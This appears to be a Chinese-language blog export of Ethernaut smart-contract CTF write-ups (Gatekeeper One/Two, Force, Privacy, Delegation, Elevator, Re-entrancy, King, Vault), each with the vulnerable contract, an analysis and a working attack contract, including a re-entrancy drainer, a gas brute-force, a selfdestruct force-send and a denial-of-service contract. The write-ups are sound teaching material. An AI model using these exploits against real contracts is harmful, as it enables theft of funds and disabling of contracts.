b是按位XOR操作。操作XOR是这样的：如果 position 中的位相等，它将导致0otherwise in a 1。使a ^ b = type(uint64).max（所以所有1）b必须是的倒数a。 这意味着我们gateKey必须是bytes8(keccak256(abi.encodePacked(msg.sender))) 在 solidity 中，没有“反向”操作，但我们可以通过XOR在输入和值之间进行操作来重新创建它F，其中只有 s。 这意味着我们可以gateKey通过执行来计算正确的bytes8(keccak256(abi.encodePacked(address(this)))) ^ 0xFFFFFFFFFFFFFFFF 2.3 参考视频 写的攻击合约 contract Hack &#123; constructor(GatekeeperTwo target) &#123; uint64 s = uint64(bytes8(keccak256(abi.encodePacked(address(this))))); uint64 k = s ^ type(uint64).max; bytes8 key = bytes8(k); require(target.enter(key), &quot;failed&quot;); &#125; &#125; 3. 解题 3.1 获取关卡实例地址：0xf0f0bbA56D2035804D70D9Ed802e422195b62134 3.2 通过传入实例的地址部署攻击合约 3.3 提交案例 3.4 成功！！！！","categories":[{"name":"Smart contracts","slug":"Smart-contracts","permalink":"https://biyouqiuqiu.com/categories/Smart-contracts/"},{"name":"ethernaut","slug":"Smart-contracts/ethernaut","permalink":"https://biyouqiuqiu.com/categories/Smart-contracts/ethernaut/"}],"tags":[{"name":"Solidity","slug":"Solidity","permalink":"https://biyouqiuqiu.com/tags/Solidity/"},{"name":"靶场","slug":"靶场","permalink":"https://biyouqiuqiu.com/tags/%E9%9D%B6%E5%9C%BA/"}]},{"title":"Force","slug":"Smart contracts/ethernaut/Force","date":"2023-01-09T03:32:10.000Z","updated":"2023-01-09T03:32:10.000Z","comments":true,"path":"2023/01/09/Smart contracts/ethernaut/Force/","link":"","permalink":"https://biyouqiuqiu.com/2023/01/09/Smart%20contracts/ethernaut/Force/","excerpt":"","text":"Force1. 题目要求 1.1 题目： 这一关的目标是使合约的余额大于0 这可能有帮助: Fallback 方法 有时候攻击一个合约最好的方法是使用另一个合约. 阅读上方的帮助页面, “Beyond the console” 部分 1.2 要求： 使合约的余额大于0 1.3 合约代码： // SPDX-License-Identifier: MIT pragma solidity ^0.8.0; contract Force &#123;/* MEOW ? /\\_/\\ / ____/ o o \\ /~____ =ø= / (______)__m_m) */&#125; 123456789101112131415161718192021## 2. 分析- 2.1 我看到这个合约首先是挺无语的哈哈哈哈🤣🤣🤣- 2.2 合约中没有没有fallback和receive函数接收以太，也没有任何一个payable的函数可以接收以太，所以我们只能强制给该合约打钱- 2.3 由于合约中什么都没有，所以我们唯一能解决这个挑战的就是使用方法`selfdestruct()`- 2.4 selfdestruct()函数的解释： `selfdestruct`命令可以用来删除智能合约，并将该合约剩余`ETH`转到指定地址。`selfdestruct`是为了应对合约出错的极端情况而设计的。它最早被命名为`suicide`（自杀），但是这个词太敏感。为了保护抑郁的程序员，改名为`selfdestruct`。- selfdestruct() 函数的使用：- ![image-20230224170947882](https://cdn.staticaly.com/gh/LBiyou/BlogImages@main/img/202306020022611.png)- 2.5 攻击合约- ```solidity contract Exploiter &#123; constructor(address payable _to) public payable &#123; // 自毁时将所有的 `msg.value` 重定向到 `to` selfdestruct(_to); &#125; &#125; 部署Exploiter合约, 构造器默认将Expoliter合约的余额转给 _to 地址 3. 解题 3.1 获取关卡实例地址：0x896317e85Fb12eA5bAD846A59870f3F672fAB7A4 3.2 部署攻击合约，并在部署时填入关卡实例地址 3.3 调用Deploy() 函数 3.4 调用实例部署的合约查看合约余额，结果 balance &gt; 0 3.5 提交案例，并查看返回结果 3.6 成功！！！！","categories":[{"name":"Smart contracts","slug":"Smart-contracts","permalink":"https://biyouqiuqiu.com/categories/Smart-contracts/"},{"name":"ethernaut","slug":"Smart-contracts/ethernaut","permalink":"https://biyouqiuqiu.com/categories/Smart-contracts/ethernaut/"}],"tags":[{"name":"Solidity","slug":"Solidity","permalink":"https://biyouqiuqiu.com/tags/Solidity/"},{"name":"靶场","slug":"靶场","permalink":"https://biyouqiuqiu.com/tags/%E9%9D%B6%E5%9C%BA/"}]},{"title":"Gatekeeper One","slug":"Smart contracts/ethernaut/Gatekeeper One","date":"2023-01-09T03:02:15.000Z","updated":"2023-01-09T03:02:15.000Z","comments":true,"path":"2023/01/09/Smart contracts/ethernaut/Gatekeeper One/","link":"","permalink":"https://biyouqiuqiu.com/2023/01/09/Smart%20contracts/ethernaut/Gatekeeper%20One/","excerpt":"","text":"Gatekeeper One1. 题目要求 1.1 越过守门人并且注册为一个参赛者来完成这一关. 这可能有帮助: 想一想你在 Telephone 和 Token 关卡学到的知识. 你可以在 solidity 文档中更深入的了解 gasleft() 函数 (参见 here 和 here). 1.2 题目代码 // SPDX-License-Identifier: MIT pragma solidity ^0.8.0; contract GatekeeperOne &#123; address public entrant; modifier gateOne() &#123; require(msg.sender != tx.origin); _; &#125; modifier gateTwo() &#123; require(gasleft() % 8191 == 0); _; &#125; modifier gateThree(bytes8 _gateKey) &#123; require(uint32(uint64(_gateKey)) == uint16(uint64(_gateKey)), &quot;GatekeeperOne: invalid gateThree part one&quot;); require(uint32(uint64(_gateKey)) != uint64(_gateKey), &quot;GatekeeperOne: invalid gateThree part two&quot;); require(uint32(uint64(_gateKey)) == uint16(uint160(tx.origin)), &quot;GatekeeperOne: invalid gateThree part three&quot;); _; &#125; function enter(bytes8 _gateKey) public gateOne gateTwo gateThree(_gateKey) returns (bool) &#123; entrant = tx.origin; return true; &#125; &#125; 12345678910111213141516171819202122232425262728293031323334353637383940414243## 2.分析#### tips：[参考博客](https://stermi.medium.com/the-ethernaut-challenge-13-solution-gatekeeper-one-7587bfb38550)- 2.1让我们把解释分成三个不同的部分 门 1：`msg.sender`和`tx.origin` 要打开这扇门，我们必须了解`msg.sender`它们`tx.origin`之间的区别。 [让我们看看 Solidity 文档对这些全局变量的](https://docs.soliditylang.org/en/latest/cheatsheet.html?#global-variables)看法： - `msg.sender`( `address`): 消息的发送者（当前通话） - `tx.origin`( `address`): 交易的发送方（完整的调用链） 当交易由 EOA 进行并直接与智能合约交互时，这些变量将具有相同的值。但是，如果它与中间人合约交互`A`，然后`B`通过直接调用（而不是 a `delegatecall`）与另一个合约交互，那么这些值将不同。 在这种情况下： - `msg.sender`将有 EOA 地址 - `tx.origin``A`将有合同的地址 因为为了`gateOne`不恢复，我们需要让`msg.sender != tx.origin`这意味着我们必须`enter`从智能合约而不是直接从玩家的 EOA 调用。 这不是挑战的一部分，但我建议您阅读我在进一步阅读中列出的关于一些安全问题和最佳实践`tx.orgin`以及何时**不应**使用它的内容。 2号门：`gasleft()` [从关于全局变量](https://docs.soliditylang.org/en/latest/cheatsheet.html?#global-variables)的 Solidity 文档中我们知道这是一个返回交易**剩余气体**`gasleft() returns (uint256)`的函数。 重要的是要知道每个 Solidity 指令实际上是一系列低级 EVM 操作码的高级表示。执行操作码后`GAS`（在[EVM 代码文档站点](https://www.evm.codes/#5a)上阅读更多内容），返回值是执行**后**剩余的气体量，也是`GAS`当前消耗**2 gas**的操作码。 事情在这里变得过于复杂，因为要通过检查，`gateTwo`您必须调用`level.enter&#123;gas: exactAmountOfGas&#125;(gateKey)`非常特定数量的气体，以便`gasleft().mod(8191)`返回`0`（剩余的气体必须是 8191 的倍数）。 你猜不到这个数字，因为你需要翻译 EVM 操作码中的所有 Solidity 代码，计算它们各自消耗的 gas 并浪费大量时间（除非你的目标也是掌握 EVM，但对于这个主题有还有大量其他资源，例如[让我们玩 EVM 谜题——边玩边学习以太坊 EVM！](https://stermi.medium.com/lets-play-evm-puzzles-learning-ethereum-evm-while-playing-43a8354a02b3)）。您还需要记住，gas 成本可能会有所不同，具体取决于使用哪个 Solidity 编译器版本将代码编译为字节码以及在此过程中使用了哪些编译标志。一团糟。 我们可以做什么？好吧，我们可以用简单的方法去**暴力破解它！**按照[cmichel 的](https://cmichel.io/ethernaut-solutions/)建议，我们可以利用我们正在使用本地测试环境（或分叉的环境）这一事实。 我们知道交易使用的 gas`enter`必须至少为 8191 加上执行这些操作码所花费的所有 gas。我们可以进行范围猜测并对其进行暴力破解，直到它起作用为止。这是代码示例： for (uint256 i = 0; i &lt;= 8191; i++) &#123; try victim.enter&#123;gas: 800000 + i&#125;(gateKey) &#123; console.log(&quot;passed with gas -&gt;&quot;, 800000 + i); break; &#125; catch &#123;&#125; &#125; 123456789101112131415161718192021222324252627282930313233 你从一个基本的 gas 值开始只是为了确保交易不会因为 Out of Gas 异常而恢复，然后你试图找到哪个 gas 值可以使交易成功。 在我们的例子中（solidity 编译器 + 优化标志）正确的 gas 值是：**802929** 关卡 3：铸造如何在 Solidity 中工作 要解决最终关口，我们首先需要了解从一种类型到另一种类型的转换以及向下转换的工作原理。Solidity 文档对其进行了很好的解释： - [Solidity 文档：基本类型之间的转换](https://docs.soliditylang.org/en/latest/types.html#conversions-between-elementary-types) - [Solidity 文档：文字和基本类型之间的转换](https://docs.soliditylang.org/en/latest/types.html#conversions-between-literals-and-elementary-types) 当您从较小的类型转换为较大的类型时，没有问题。所有的高位都用零填充，值不变。问题是当您将较大的类型转换为较小的类型时。根据值的不同，您可能会遇到数据丢失的情况，因为那些高阶位会丢失并被截断。例如，`uint16(0x0101)`是`257`十进制的，但如果你向下转换它，`uint8`它将是`1`十进制的！- 2.2 [参考视频](https://www.youtube.com/watch?v=hOQWIIx5SRc) 写的攻击合约- ```solidity interface IGateKeeperOne &#123; function entrant() external view returns (address); function enter(bytes8) external returns (bool); &#125; contract Hack &#123; function enter (address _target, uint256 gas) external &#123; IGateKeeperOne target = IGateKeeperOne(_target); uint16 k16 = uint16(uint160(tx.origin)); uint64 k64 = uint64(1 &lt;&lt; 63) + uint64(k16); bytes8 key = bytes8(k64); require(gas &lt; 8191, &quot;gas &gt; 8191&quot;); require(target.enter&#123;gas: 8191 * 10 + gas&#125;(key), &quot;failed&quot;); &#125; &#125; 3.解题 3.1 获取关卡实例地址：0xAd682B7a072dc407361a23D0C9Ee9f1C16dEa187 3.2 部署攻击合约，调用enter() 函数，将关卡实例地址传入enter() 函数中，并设置gas &#x3D; 256 3.3 提交案例 3.4 成功！！！！！","categories":[{"name":"Smart contracts","slug":"Smart-contracts","permalink":"https://biyouqiuqiu.com/categories/Smart-contracts/"},{"name":"ethernaut","slug":"Smart-contracts/ethernaut","permalink":"https://biyouqiuqiu.com/categories/Smart-contracts/ethernaut/"}],"tags":[{"name":"Solidity","slug":"Solidity","permalink":"https://biyouqiuqiu.com/tags/Solidity/"},{"name":"靶场","slug":"靶场","permalink":"https://biyouqiuqiu.com/tags/%E9%9D%B6%E5%9C%BA/"}]},{"title":"Privacy","slug":"Smart contracts/ethernaut/Privacy","date":"2023-01-09T02:16:15.000Z","updated":"2023-01-09T02:16:15.000Z","comments":true,"path":"2023/01/09/Smart contracts/ethernaut/Privacy/","link":"","permalink":"https://biyouqiuqiu.com/2023/01/09/Smart%20contracts/ethernaut/Privacy/","excerpt":"","text":"Privacy1. 题目要求 1.1 这个合约的制作者非常小心的保护了敏感区域的 storage.解开这个合约来完成这一关.这些可能有帮助: 理解 storage 的原理 理解 parameter parsing 的原理 理解 casting 的原理 1.2 题目代码： // SPDX-License-Identifier: MIT pragma solidity ^0.8.0; contract Privacy &#123; bool public locked = true; uint256 public ID = block.timestamp; uint8 private flattening = 10; uint8 private denomination = 255; uint16 private awkwardness = uint16(block.timestamp); bytes32[3] private data; constructor(bytes32[3] memory _data) &#123; data = _data; &#125; function unlock(bytes16 _key) public &#123; require(_key == bytes16(data[2])); locked = false; &#125; /* A bunch of super advanced solidity algorithms... ,*&#39;^`*.,*&#39;^`*.,*&#39;^`*.,*&#39;^`*.,*&#39;^`*.,*&#39;^` .,*&#39;^`*.,*&#39;^`*.,*&#39;^`*.,*&#39;^`*.,*&#39;^`*.,*&#39;^`*., *.,*&#39;^`*.,*&#39;^`*.,*&#39;^`*.,*&#39;^`*.,*&#39;^`*.,*&#39;^`*.,*&#39;^ ,---/V\\ `*.,*&#39;^`*.,*&#39;^`*.,*&#39;^`*.,*&#39;^`*.,*&#39;^`*.,*&#39;^`*.,*&#39;^`*. ~|__(o.o) ^`*.,*&#39;^`*.,*&#39;^`*.,*&#39;^`*.,*&#39;^`*.,*&#39;^`*.,*&#39;^`*.,*&#39;^`*.,*&#39; UU UU */ &#125; 123456789101112131415161718192021222324252627282930313233343536373839## 2. 分析- 2.1 目标：将locked修改为false - `bool public locked`初始化为 true 并保存必须设置为 false 才能赢得挑战的值 - `bytes32[3] private data`是存储我们的密钥的变量。我们需要找出`data[2]`解决挑战的价值- 2.2 我们可以将所有其他变量仅视为“存储填充”，以达到我们想要读取的内容 ( `data[2]`) 以解决挑战。 - `constructor(bytes32[3] memory _data)`初始化`data`变量的值 - 然后我们只需检查我们传递的输入`unlock(bytes16 _key)`是否与值匹配。如果比较返回 true，我们就**解锁了**合约，通过了挑战。`byte16 _key``data[2]``true`- 2.3 `data`首先，必须检索变量中的数据。这可以通过从区块链上的合约存储中提取数据来完成。在 brownie 中，这可以使用 来完成`web3.eth.getStorageAt()`，第一个参数是合约的地址，以及要查看的合约存储槽的方向。每个槽的容量为 32 字节（256 位），这意味着实际填满 32 字节槽的数据类型将占用整个槽，因此后续数据类型将滚动到下一个槽。如果数据类型声明为`uint256`或`bytes32`，它将始终占用一个完整的存储槽，因为这些类型的大小已经是 32 字节。 在隐私合约的情况下，我们知道相关数据是数组的最后一个元素`data`。因此，要提取这个，我们必须确定这条数据在*哪里，在什么存储槽中。*- 2.4 [参考博客](https://dac.ac/blog/ethernaut_solutions/#delegation)- ![image-20230224230120932](https://cdn.staticaly.com/gh/LBiyou/BlogImages@main/img/202306020025595.png)- 2.5 在浏览器控制台依次执行 **web3.eth.getStorageAt() ** ，**data.slice(0,34)** 命令## 3 .解题- 3.1 获取关卡实例地址：0xb6b2910033C8934D4eBf2FBb72EF87cbC09BE4d0- 3.2 依次执行如下代码得到 data[2] - ```solidity addr = &quot;0xb6b2910033C8934D4eBf2FBb72EF87cbC09BE4d0&quot; &#x27;0xb6b2910033C8934D4eBf2FBb72EF87cbC09BE4d0&#x27; await web3.eth.getStorageAt(addr, 5) &#x27;0xa9cbb829703de0df913fc95cc78d10df15dc54270f501657492c89ceec732fb2&#x27; data = &quot;0xa9cbb829703de0df913fc95cc78d10df15dc54270f501657492c89ceec732fb2&quot; &#x27;0xa9cbb829703de0df913fc95cc78d10df15dc54270f501657492c89ceec732fb2&#x27; data.slice(0,34) &#x27;0xa9cbb829703de0df913fc95cc78d10df&#x27; 3.3 调用实例部署的合约，并查看locked 的值为true 3.4 将执行data.slice(0,34) 得到的值传入unlock的形参中，并调用unlock() 函数 3.5 查看locked的值，值由true 变成 false 3.6 提交实例 3.7 成功！！！！","categories":[{"name":"Smart contracts","slug":"Smart-contracts","permalink":"https://biyouqiuqiu.com/categories/Smart-contracts/"},{"name":"ethernaut","slug":"Smart-contracts/ethernaut","permalink":"https://biyouqiuqiu.com/categories/Smart-contracts/ethernaut/"}],"tags":[{"name":"Solidity","slug":"Solidity","permalink":"https://biyouqiuqiu.com/tags/Solidity/"},{"name":"靶场","slug":"靶场","permalink":"https://biyouqiuqiu.com/tags/%E9%9D%B6%E5%9C%BA/"}]},{"title":"Delegate","slug":"Smart contracts/ethernaut/Delegate","date":"2023-01-09T01:32:10.000Z","updated":"2023-01-09T01:32:10.000Z","comments":true,"path":"2023/01/09/Smart contracts/ethernaut/Delegate/","link":"","permalink":"https://biyouqiuqiu.com/2023/01/09/Smart%20contracts/ethernaut/Delegate/","excerpt":"","text":"Delegate1. 题目要求 1.1 这一关的目标是申明你对你创建实例的所有权. 这可能有帮助 仔细看solidity文档关于 delegatecall 的低级函数, 他怎么运行的, 他如何将操作委托给链上库, 以及他对执行的影响. Fallback 方法 方法 ID 1.2 题目代码： // SPDX-License-Identifier: MIT pragma solidity ^0.8.0; contract Delegate &#123; address public owner; constructor(address _owner) &#123; owner = _owner; &#125; function pwn() public &#123; owner = msg.sender; &#125; &#125; contract Delegation &#123; address public owner; Delegate delegate; constructor(address _delegateAddress) &#123; delegate = Delegate(_delegateAddress); owner = msg.sender; &#125; fallback() external &#123; (bool result,) = address(delegate).delegatecall(msg.data); if (result) &#123; this; &#125; &#125; &#125; 2. 分析 2.1 elegation.sol 这是我们可以直接访问的合约。让我们来看看。它有两个状态变量： address public owner存储合约所有者的公共变量 Delegate delegate``Delegate对我们刚刚看到的合同的引用 合约constructor的 将其address _delegateAddress作为唯一的输入参数，delegate用它初始化状态变量并用 初始化所有者msg.sender 2.2 通过修改燃料限制的方法，出错了。。。 开始网上寻找解决方法，解决方法：修改编辑燃料费选项为 “高级” 3. 解题 3.1 获取关卡实例地址：0x6eE471bd0AE8A991C76972ADB0365D7cfC4e3fE9 3.2 通过实例地址调用合约 3.3 调用Dlegate合约中的 pwn()函数，将燃料限制从29328修改为39328 3.3 发现做错了 wwww….. 弄了好久，原来是需要修改编辑燃料费选项, 将其设置为“高级” 3.4 再次调用pwn() 函数，地址修改成功 3.5 到EtherScan 查看交易记录，发现成功调用pwn函数 3.6 提交实例并查看结果 3.7 成功！！！！ tips：1.参考博客 2. 参考视频","categories":[{"name":"Smart contracts","slug":"Smart-contracts","permalink":"https://biyouqiuqiu.com/categories/Smart-contracts/"},{"name":"ethernaut","slug":"Smart-contracts/ethernaut","permalink":"https://biyouqiuqiu.com/categories/Smart-contracts/ethernaut/"}],"tags":[{"name":"Solidity","slug":"Solidity","permalink":"https://biyouqiuqiu.com/tags/Solidity/"},{"name":"靶场","slug":"靶场","permalink":"https://biyouqiuqiu.com/tags/%E9%9D%B6%E5%9C%BA/"}]},{"title":"Elevator","slug":"Smart contracts/ethernaut/Elevator ","date":"2023-01-08T13:16:15.000Z","updated":"2023-01-08T13:16:15.000Z","comments":true,"path":"2023/01/08/Smart contracts/ethernaut/Elevator /","link":"","permalink":"https://biyouqiuqiu.com/2023/01/08/Smart%20contracts/ethernaut/Elevator%20/","excerpt":"","text":"Elevator1. 题目要求 1.1 电梯不会让你达到大楼顶部, 对吧? 这可能有帮助: 有的时候 solidity 不是很擅长保存 promises. 这个 电梯 期待被用在一个 建筑 里. 1.2 题目代码： // SPDX-License-Identifier: MIT pragma solidity ^0.8.0; interface Building &#123; function isLastFloor(uint) external returns (bool); &#125; contract Elevator &#123; bool public top; uint public floor; function goTo(uint _floor) public &#123; Building building = Building(msg.sender); if (! building.isLastFloor(_floor)) &#123; floor = _floor; top = building.isLastFloor(floor); &#125; &#125; &#125; 123456789101112131415161718192021222324252627282930## 2. 分析#### tips： [参考博客](https://dac.ac/blog/ethernaut_solutions/#delegation)- 2.1 `isLastFloor()`的返回值必须为 False 才能`floor`更改并变为`top`true。我想到了两种方法： 1. 我们让我们的顶层不是 0（ 的起始值`floor`）并且我们检查是否`floor`是顶层的数值。然后我们定义函数返回当前值和顶层值`isLastFloor()`之间的比较。`floor` 2. 我们创建了一个将电梯发送到其当前楼层 (0) 的函数，但我们运行此函数两次，第一次，我们确保返回`isLastFloor()`false，然后仅返回 true。这实际上意味着我们的顶层是 0 层。但是在第二次运行期间，`top`变成了真的。- 2.2 [参考视频](https://www.youtube.com/watch?v=IfljmOqThvI) 写的攻击合约- ```solidity contract Hack &#123; Elevator private immutable target; uint private count; constructor(address _target) &#123; target = Elevator(_target); &#125; function pwn() external &#123; target.goTo(1); require(target.top(), &quot;not top&quot;); &#125; function isLastFloor(uint) external returns (bool) &#123; count++; return count &gt; 1; &#125; &#125; 3. 解题 3.1 获取关卡实例地址： 0x156b4F96D63961020a9fe45947d4eAB6F4053aA8 3.2 通过实例地址部署攻击合约： 3.3 调用pwn() 函数 3.4 提交实例查看结果 3.5 成功！！！！","categories":[{"name":"Smart contracts","slug":"Smart-contracts","permalink":"https://biyouqiuqiu.com/categories/Smart-contracts/"},{"name":"ethernaut","slug":"Smart-contracts/ethernaut","permalink":"https://biyouqiuqiu.com/categories/Smart-contracts/ethernaut/"}],"tags":[{"name":"Solidity","slug":"Solidity","permalink":"https://biyouqiuqiu.com/tags/Solidity/"},{"name":"靶场","slug":"靶场","permalink":"https://biyouqiuqiu.com/tags/%E9%9D%B6%E5%9C%BA/"}]},{"title":"Re-entrancy","slug":"Smart contracts/ethernaut/Re-entrancy","date":"2023-01-08T10:13:13.000Z","updated":"2023-01-08T10:13:13.000Z","comments":true,"path":"2023/01/08/Smart contracts/ethernaut/Re-entrancy/","link":"","permalink":"https://biyouqiuqiu.com/2023/01/08/Smart%20contracts/ethernaut/Re-entrancy/","excerpt":"","text":"Re-entrancy1. 题目要求 1.1 这一关的目标是偷走合约的所有资产. 这些可能有帮助: 不可信的合约可以在你意料之外的地方执行代码. Fallback methods 抛出&#x2F;恢复 bubbling 有的时候攻击一个合约的最好方式是使用另一个合约. 查看上方帮助页面, “Beyond the console” 部分 1.2 题目代码： // SPDX-License-Identifier: MIT pragma solidity ^0.6.12; import &#39;openzeppelin-contracts-06/math/SafeMath.sol&#39;; contract Reentrance &#123; using SafeMath for uint256; mapping(address =&gt; uint) public balances; function donate(address _to) public payable &#123; balances[_to] = balances[_to].add(msg.value); &#125; function balanceOf(address _who) public view returns (uint balance) &#123; return balances[_who]; &#125; function withdraw(uint _amount) public &#123; if(balances[msg.sender] &gt;= _amount) &#123; (bool result,) = msg.sender.call&#123;value:_amount&#125;(&quot;&quot;); if(result) &#123; _amount; &#125; balances[msg.sender] -= _amount; &#125; &#125; receive() external payable &#123;&#125; &#125; 123456789101112131415161718## 2. 分析#### tips: [参考博客](https://stermi.medium.com/the-ethernaut-challenge-9-solution-re-entrancy-635303881a4f)- 2.1 分析代码- ```solidity function withdraw(uint _amount) public &#123; if(balances[msg.sender] &gt;= _amount) &#123; (bool result,) = msg.sender.call&#123;value:_amount&#125;(&quot;&quot;); if(result) &#123; _amount; &#125; balances[msg.sender] -= _amount; &#125; - a.该功能检查是否`msg.sender`有足够的余额来提取`_amount`以太币 - b.`_amount`它继续通过一个低级函数发送请求，`call`该函数将使用所有剩余的`gas`来执行操作 - c.它更新`msg.sender`减少金额的余额 &#96;漏洞利用选项 1，懒惰而不聪明的选项：在循环中利用重入 如果资金不是问题，我们可以0.001 ether / 100通过donate函数发送并重新进入withdraw函数 100 次 + 初始调用。 0.001 ether / 100只是一个任意值，我们只需要确保在重新进入函数时不会消耗太多气体，withdraw否则交易会因为Out of Gas 异常而恢复。 漏洞利用选项 2，切肉刀方式：利用重入和下溢 这个解决方案要优雅得多，它利用了两个不同的问题：重入和下溢！ 我们已经知道重入问题，并且我们说balances[msg.sender] -= _amount“正常”操作的下溢将受到保护，因为balances[msg.sender] &gt;= _amount即使该操作不使用SafeMath，如果我们确定 max，也没有办法下溢可能balances[msg.sender]会归零。 但是因为我们可以重新输入，所以我们可以执行两次相同的balances[msg.sender] -= _amount操作，所以我们的余额第一次会变为零，但第二次会type(uint256).max因为下溢而变为零！ 此时，我们可以调用withdraw提取存储在受害者合约中的全部以太币！ 注意：第二种解决方案只有在下溢的情况下才有可能。如果不存在下溢问题，我们仍然可以通过重入循环解决方案来解决挑战。&#96; 2.2 参考视频 写的攻击合约: interface IReentracy &#123; function donate(address) external payable; function withdraw(uint256) external; &#125; contract Hack&#123; IReentracy private immutable target; constructor(address _target) public &#123; target = IReentracy(_target); &#125; function attack() public payable&#123; target.donate.value(0.001 ether)(address(this)); target.withdraw(1e18); &#125; receive() external payable &#123; uint amount = min(1e18, address(target).balance); if (amount &gt; 0) &#123; target.withdraw(amount); &#125; require(address(target).balance == 0, &quot;target balance &gt; 0&quot;); selfdestruct(payable(msg.sender)); &#125; function min(uint x, uint y) private pure returns(uint) &#123; return x &lt;= y ? x : y; &#125; &#125; 2.3 进行重入攻击即可 3. 解题 3.1 获取关卡的实例：0xcf96fB43ffF6B6F8c05f353ce8271931271E69b0 3.2 利用实例地址部署Hack合约，调用attrack() 函数 设置msg.value &#x3D; 1 ether 3.3 提交实例并查看结果 3.4 成功！！！！！","categories":[{"name":"Smart contracts","slug":"Smart-contracts","permalink":"https://biyouqiuqiu.com/categories/Smart-contracts/"},{"name":"ethernaut","slug":"Smart-contracts/ethernaut","permalink":"https://biyouqiuqiu.com/categories/Smart-contracts/ethernaut/"}],"tags":[{"name":"Solidity","slug":"Solidity","permalink":"https://biyouqiuqiu.com/tags/Solidity/"},{"name":"靶场","slug":"靶场","permalink":"https://biyouqiuqiu.com/tags/%E9%9D%B6%E5%9C%BA/"}]},{"title":"King","slug":"Smart contracts/ethernaut/King","date":"2023-01-08T08:17:13.000Z","updated":"2023-01-08T08:17:13.000Z","comments":true,"path":"2023/01/08/Smart contracts/ethernaut/King/","link":"","permalink":"https://biyouqiuqiu.com/2023/01/08/Smart%20contracts/ethernaut/King/","excerpt":"","text":"King1. 题目要求 1.1 题目：下面的合约表示了一个很简单的游戏: 任何一个发送了高于目前价格的人将成为新的国王. 在这个情况下, 上一个国王将会获得新的出价, 这样可以赚得一些以太币. 看起来像是庞氏骗局.这么有趣的游戏, 你的目标是攻破他, 当你提交实例给关卡时, 关卡会重新申明王位. 你需要阻止他重获王位来通过这一关. 1.2 题目代码： // SPDX-License-Identifier: MIT pragma solidity ^0.8.0; contract King &#123; address king; uint public prize; address public owner; constructor() payable &#123; owner = msg.sender; king = msg.sender; prize = msg.value; &#125; receive() external payable &#123; require(msg.value &gt;= prize || msg.sender == owner); payable(king).transfer(msg.value); king = msg.sender; prize = msg.value; &#125; function _king() public view returns (address) &#123; return king; &#125; &#125; 1234567891011121314151617181920212223242526## 2. 分析### tips：[参考博客](https://stermi.medium.com/the-ethernaut-challenge-9-solution-king-ee9a689bcf0e)- 2.1 阅读代码可知，该`receive`函数是一个**特殊**函数，允许合约直接从外部合约或 EOA 接收以太币- 2.2 我们首先看到的是`require(msg.value &gt;= prize || msg.sender == owner)`。此检查允许`owner`合约的 始终拥有合约的王权，重置所有值。- 2.3 所以现在我们知道`transfer`允许您将 Ether 发送到一个地址，消耗`2300`gas 并在无法执行交易时**恢复。** 如果“将以太币转移到”交易恢复，为什么会出现问题？好吧，因为如果还原，我们的功能`transfer`也会**还原！**并且通过还原它会使**合约无法使用**，没有人可以成为新的国王！`receive` 一种可能的解决方案是只创建一个`Contract`不接受任何类型的 Ether 转移的对象。- 2.4 攻击合约- ```solidity contract Exploiter &#123; constructor(address payable _to) payable &#123; (bool success, ) = address(_to).call&#123;value: msg.value&#125;(&quot;&quot;); require(success, &quot;call failed!!!&quot;); &#125; &#125; 2.5 获取实例地址，并填入到Exploiter合约构造器中 3. 解题 3.1 获取关卡实例地址：0x25766108F8Fa65C8061FB17E7762D4BC42Fc882C 3.2 调用关卡实例部署的合约，得到实例合约中的prize 3.3 根据关卡实例地址部署攻击合约 3.4 Deploy后查看king的值发生了改变 3.5 提交实例 3.6 成功！！！！！","categories":[{"name":"Smart contracts","slug":"Smart-contracts","permalink":"https://biyouqiuqiu.com/categories/Smart-contracts/"},{"name":"ethernaut","slug":"Smart-contracts/ethernaut","permalink":"https://biyouqiuqiu.com/categories/Smart-contracts/ethernaut/"}],"tags":[{"name":"Solidity","slug":"Solidity","permalink":"https://biyouqiuqiu.com/tags/Solidity/"},{"name":"靶场","slug":"靶场","permalink":"https://biyouqiuqiu.com/tags/%E9%9D%B6%E5%9C%BA/"}]},{"title":"Vault","slug":"Smart contracts/ethernaut/Vault","date":"2023-01-08T07:10:10.000Z","updated":"2023-01-08T07:10:10.000Z","comments":true,"path":"2023/01/08/Smart contracts/ethernaut/Vault/","link":"","permalink":"https://biyouqiuqiu.com/2023/01/08/Smart%20contracts/ethernaut/Vault/","excerpt":"","text":"1.题目要求 1.1 要求 ：打开 vault 来通过这一关! 题目代码： // SPDX-License-Identifier: MIT pragma solidity ^0.8.0; contract Vault &#123; bool public locked; bytes32 private password; constructor(bytes32 _password) &#123; locked = true; password = _password; &#125; function unlock(bytes32 _password) public &#123; if (password == _password) &#123; locked = false; &#125; &#125; &#125; 2. 分析 2.1 在区块链上使用或开发时，首先要记住的是，区块链中没有任何东西是私有的。即使您将变量声明为private或 ，也可以看到所有内容internal 2.2 状态变量存储在合约存储中，因为变量password是一个 32 字节的数据，它总是会填满整个槽，使得它在合约的第二个槽中的位置非常可预测，因为第二个状态变量定义。 在这种情况下，我们可以很容易地使用web3.pygetstorageat()上的功能，通过在第二个存储槽中查找来查看密码是什么。然后我们可以选择将其转换为文本以查看密码是什么。 2.3 在浏览器控制台上执行 * await web3.eth.getStorageAt(contract.address,1) * 命令 获取password 然后在 关卡实例部署的合约上输入获取到的 password 3. 解题 3.1 获取关卡实例地址：0x3741430AB42C816Dbbe583001C9615049ad09e31 3.2 执行 *await web3.eth.getStorageAt(contract.address,1) * 得到password ：0x412076657279207374726f6e67207365637265742070617373776f7264203a29 调用实例部署 的合约,并调用合约的 unlock() 函数： 3.3 对比调用 unlock() 函数之后locked 的值 3.4 提交案例并查看结果 3.5 成功！！！！","categories":[{"name":"Smart contracts","slug":"Smart-contracts","permalink":"https://biyouqiuqiu.com/categories/Smart-contracts/"},{"name":"ethernaut","slug":"Smart-contracts/ethernaut","permalink":"https://biyouqiuqiu.com/categories/Smart-contracts/ethernaut/"}],"tags":[{"name":"Solidity","slug":"Solidity","permalink":"https://biyouqiuqiu.com/tags/Solidity/"},{"name":"靶场","slug":"靶场","permalink":"https://biyouqiuqiu.com/tags/%E9%9D%B6%E5%9C%BA/"}]},{"title":"Token","slug":"Smart contracts/ethernaut/Token","date":"2023-01-08T06:30:10.000Z","updated":"2023-01-08T06:30:10.000Z","comments":true,"path":"2023/01/08/Smart contracts/ethernaut/Token/","link":"","permalink":"https://biyouqiuqiu.com/2023/01/08/Smart%20contracts/ethernaut/Token/","excerpt":"","text":"Token1. 题目要求 1.1 这一关的目标是攻破下面这个基础 token 合约 1.2 你最开始有20个 token, 如果你通过某种方法可以增加你手中的 token 数量,你就可以通过这一关,当然越多越好 